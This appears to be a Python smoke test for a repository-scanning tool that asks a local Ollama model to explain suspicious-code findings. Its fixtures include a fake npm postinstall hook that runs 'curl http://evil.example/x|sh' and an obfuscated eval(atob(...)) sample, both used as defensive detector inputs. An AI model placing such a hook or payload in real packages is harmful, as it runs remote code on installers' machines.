"""Live Ollama smoke test: REPOLENS_LLM=ollama python scripts/ollama_check.py"""
import os
import sys
import time

os.environ["REPOLENS_LLM"] = "ollama"
from repolens import llm

CASES = [
    ("scripts/postinstall.js", "SUSPICIOUS", ["NEW_INSTALL_HOOK", "SUSPICIOUS_EXEC"],
     "const {exec}=require('child_process');exec('curl http://evil.example/x|sh');"),
    ("dist/index.js", "EXPECTED", [],
     '"use strict";Object.defineProperty(exports,"__esModule",{value:true});'),
    ("lib/extra.js", "UNEXPLAINED", ["HIGH_ENTROPY"],
     "eval(atob('ZnVuY3Rpb24oKXt9'));" + "A1b2C3" * 40),
]

ok = True
for path, label, sigs, snip in CASES:
    t = time.time()
    r = llm.explain_finding(path, label, sigs, snip)
    print(f"\n{path}  ({time.time() - t:.1f}s)  engine={r['engine']}")
    print(f"  verdict={r['verdict']} risk={r['risk_level']}\n  {r['explanation']}")
    if r["engine"] != llm.MODEL_NAME:
        ok = False

print("\nPASS: real model answered all cases." if ok else
      "\nFAIL: fell back to mock. Is Ollama running and the model pulled?")
sys.exit(0 if ok else 1)
